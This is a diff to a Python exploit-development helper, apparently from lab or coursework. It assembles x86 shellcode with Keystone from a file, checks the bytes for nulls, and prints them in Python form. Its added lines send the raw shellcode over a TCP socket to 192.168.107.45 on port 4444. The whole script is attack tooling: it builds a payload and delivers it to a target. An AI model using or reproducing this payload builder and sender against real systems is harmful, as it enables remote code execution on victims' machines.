@@ -1,7 +1,7 @@
 import ctypes, struct, sys
 from keystone import *
 
-badchars = b""
+badchars = b"\x00"
 
 CODE = ""
 with open(sys.argv[1]) as f:
@@ -17,6 +17,12 @@ with open(sys.argv[1]) as f:
 ks = Ks(KS_ARCH_X86, KS_MODE_32)
 encoding, count = ks.asm(CODE)
 print("Encoded %d instructions..." % count)
+
+finalErrors = []
+for e in encoding:
+    if e in badchars:
+        finalErrors.append(str(f"FINAL ERROR FOUND {e, hex(e)}"))
+        break
 
 sh = b""
 for e in encoding:
@@ -50,14 +56,33 @@ for i in range(0, len(shellcode), 10):
     line = ''.join(f'\\x{b:02x}' for b in chunk)
     print(f'shellcode += b"{line}"')
 
-print("total bytes: ", len(shellcode))
 
-if len(errors) > 0:
-    print()
-    for e in errors:
-        print(e)
-    print()
-    print("badchars: ", " ".join([hex(c) for c in badchars]))
+print()
+for e in errors:
+    print(e)
+print()
+
+print()
+for e in finalErrors:
+    print(e)
+print()
+print("badchars: ", " ".join([hex(c) for c in badchars]))
+
+
+
+# print C
+# line = ''.join(f'\\x{b:02x}' for b in shellcode)
+# print(f'char shellcode[] = "{line}";')
+
+# print("total bytes: ", len(shellcode))
+
+
+print("SENDING")
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.107.45", 4444))
+s.send(shellcode)
+s.close()
 
 
 # ks = Ks(KS_ARCH_X86, KS_MODE_32)
